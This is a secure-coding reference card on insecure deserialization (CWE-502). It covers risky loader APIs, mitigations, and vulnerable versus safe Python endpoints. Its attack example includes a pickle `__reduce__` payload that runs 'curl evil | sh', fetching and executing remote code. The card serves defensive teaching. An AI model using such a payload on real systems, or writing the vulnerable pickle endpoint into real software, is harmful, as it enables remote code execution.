# CWE-502: Insecure Deserialization

## Plain-English explanation
The app takes a serialized blob from an attacker and reconstructs objects from it. The serialization format calls constructors / `__init__` / setter functions during loading — so a carefully crafted blob runs arbitrary code as a side effect of "just loading data".

## Typical attack pattern
A Python service uses `pickle.loads(request.body)` to receive cached objects. The attacker sends a pickle that includes `__reduce__` returning `(os.system, ("curl evil | sh",))`. Loading the pickle executes the command. Same shape exists in Java with `ObjectInputStream`, PHP with `unserialize`, and Ruby with `Marshal.load`.

## Reachability hints
- `pickle.load*`, `marshal.loads`, `dill.loads`, `cloudpickle.loads`.
- `yaml.load(...)` (without `SafeLoader`) — instantiates Python objects from tags.
- Java `ObjectInputStream.readObject`, `XMLDecoder`.
- Ruby `Marshal.load`, `YAML.load` (without `safe_load`).
- Node.js libraries that "rehydrate" classes from JSON via `toJSON`/`fromJSON` hooks — depends on the lib.

## Common workarounds when a bump is blocked
- Switch to a data-only format: JSON for cross-trust boundaries. JSON's `parse` instantiates plain objects, not classes.
- For YAML: `yaml.safe_load` / `SafeLoader` — exception, no object construction.
- For Java: replace `ObjectInputStream` with Jackson and a strict allowlist of polymorphic types.
- If you must use a code-aware serializer, add an HMAC of the blob with a server-side key and verify before loading.

## Concrete code example

```python
# Vulnerable
import pickle
@app.post("/cache")
def cache(body: bytes):
    obj = pickle.loads(body)        # arbitrary code execution
    process(obj)

# Safe
import json
@app.post("/cache")
def cache(body: bytes):
    obj = json.loads(body)          # plain dicts / lists only
    process(Schema.model_validate(obj))   # then validate the shape
```
